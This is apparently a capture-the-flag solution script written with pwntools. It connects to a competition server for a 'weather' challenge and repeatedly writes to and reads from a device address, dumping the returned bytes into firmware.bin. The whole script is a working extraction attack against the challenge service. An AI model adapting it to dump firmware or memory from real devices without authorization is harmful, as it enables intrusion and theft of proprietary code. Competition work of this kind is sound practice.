from pwn import *
io = remote("weather.2022.ctfcompetition.com", 1337)
print(io.recvline())
print(io.recvline())

addr = b"111137"
data = []
i = 0
try:
    while True:
        io.sendline(b'w ' + addr + b' 1 ' + str(i).encode())
        io.recvline()
        io.sendline(b'r ' + addr + b' 64')
        io.recvline()
        out = []
        for _ in range(4):
            out.append(io.recvline())
        data.append(out)
        io.recvline()
        i += 1
finally:
    data.pop()
    open("firmware.bin", "ab").write(b''.join([b''.join([b''.join([p8(int(b)) for b in line.strip().split(b' ')]) for line in block]) for block in data]))
    print("last: %d", i)